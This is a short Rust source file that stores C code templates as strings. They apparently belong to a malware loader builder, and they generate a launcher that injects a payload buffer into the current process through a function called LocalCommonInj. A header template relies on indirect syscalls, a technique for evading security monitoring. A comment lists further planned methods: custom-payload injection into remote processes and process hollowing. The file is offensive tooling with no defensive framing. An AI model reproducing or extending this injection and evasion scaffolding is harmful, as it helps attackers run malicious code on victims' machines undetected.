pub const LOCALCOMMONINJ_INCLUDE: &str = r#"
#include "../include/LocalCommonInj.h"
"#;
pub const LOCALCOMMONINJ_CODE: &str = r#"
    PVOID pBufferArg = malloc(sBufferSize);
    memcpy(pBufferArg, pBuffer, sBufferSize);
    memset(pBuffer, 0, sBufferSize);
    LAUNCHER_STATUS LauncherStatus = LocalCommonInj(pBufferArg, sBufferSize, g_Nt);
        if (LauncherStatus != LAUNCHER_STATUS_SUCCESS)
        {
                printf("Error in LocalCommonInj\n");
                return EXIT_FAILURE;
        }
        printf("Injection success");
"#;

pub const LOCALCOMMONINJ_H: &str = r#"
#pragma once

#include <windows.h>
#include "./IndirectSyscall.h"

typedef enum LAUNCHER_STATUS
{
	LAUNCHER_STATUS_FAILED,
	LAUNCHER_STATUS_SUCCESS,
	LAUNCHER_STATUS_INVALID_PARAMETER,

} LAUNCHER_STATUS;

/*
 
 Injection Method List

1) LocalCommonInj: Inject a buffer into the current process
2) CaroKannLocalCommonInj: Inject a buffer into the current process with custom payload
3) CaroKannRemoteCommonInj: Inject a buffer into a remote process with custom payload
TODO : 4) CaroKannHollow: Hollow a remote process with custom payload

*/
LAUNCHER_STATUS LocalCommonInj(IN PVOID pBuffer, IN DWORD sBufferSize, IN PNTAPI_FUNC g_Nt);
"#;
